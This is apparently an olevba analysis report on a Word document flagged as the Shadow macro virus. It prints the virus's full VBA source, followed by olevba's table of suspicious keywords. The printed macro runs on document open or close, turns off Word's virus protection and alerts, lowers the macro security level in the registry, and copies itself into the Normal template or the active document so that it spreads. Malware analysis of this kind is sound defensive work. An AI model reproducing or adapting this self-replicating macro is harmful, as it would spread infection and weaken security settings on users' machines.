olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Shadow-56cd2fc263ce28e2be567ae43e32968d8f4c00d8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Shadow-56cd2fc263ce28e2be567ae43e32968d8f4c00d8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Shadow
Private Sub Document_Open()
On Error Resume Next
Options.VirusProtection = (0)
Options.SaveNormalPrompt = (0)
Application.DisplayAlerts = (0)
Application.ScreenUpdating = (0)
Application.EnableCancelKey = (0)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
γ = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot") & ".\TEMP\"
Do While FileLen(γ & System.ProfileString("", "DefaultFileName")) = 0
Randomize: α = "~WR00000.TMP"
Mid(α, 4, 1) = Chr(Int((26 * Rnd) + 65))
Mid(α, 8, 1) = Int(Rnd() * 10)
VBProject.VBComponents(1).Export (γ & α)
Open γ & α For Input As #1
For η = 1 To 4: Line Input #1, �: Next: η = ""
Do Until ι = "'�"
Line Input #1, ι
η = η & ι & Chr(13) & Chr(10)
Loop: Close #1
Open γ & α For Output As #1: Print #1, η: Close #1
System.ProfileString("", "DefaultFileName") = α: Loop
Set α = IIf(MacroContainer <> NormalTemplate, NormalTemplate, ActiveDocument).VBProject.VBComponents(1)
If α.CodeModule.CountOfLines > 0 Or ActiveDocument.Path = "" Then Exit Sub
α.CodeModule.AddFromFile γ & System.ProfileString("", "DefaultFileName")
α.CodeModule.Replaceline 2, "Private Sub " & IIf(MacroContainer <> NormalTemplate, "Document_Open()", "Document_Close()")
End Sub
'�

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

